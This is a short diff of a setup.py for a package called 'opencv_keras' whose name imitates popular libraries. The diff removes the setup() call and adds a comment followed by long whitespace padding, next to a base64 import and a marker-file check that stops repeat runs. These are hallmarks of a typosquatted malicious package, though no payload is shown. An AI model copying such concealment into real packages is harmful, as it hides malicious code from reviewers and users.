@@ -9,22 +9,7 @@ import base64
 VERSION = '17.10.13'
 DESCRIPTION = 'A library for data visualization'
 LONG_DESCRIPTION = 'Really helpful'
-setup(
-    name="opencv_keras",
-    version=VERSION,
-    author="DreamyOakXTimmywag",
-    author_email="DreamyOakXTimmywag@dreamyoak.onrender.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    packages=find_packages(),
-    install_requires=[''],
-    keywords=['python','arg','args','print','nagogy','echo'],
-    classifiers=[
-        "Programming Language :: Python :: 3",
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
 if os.path.exists("hifromDreamyOak"):
     exit(0)
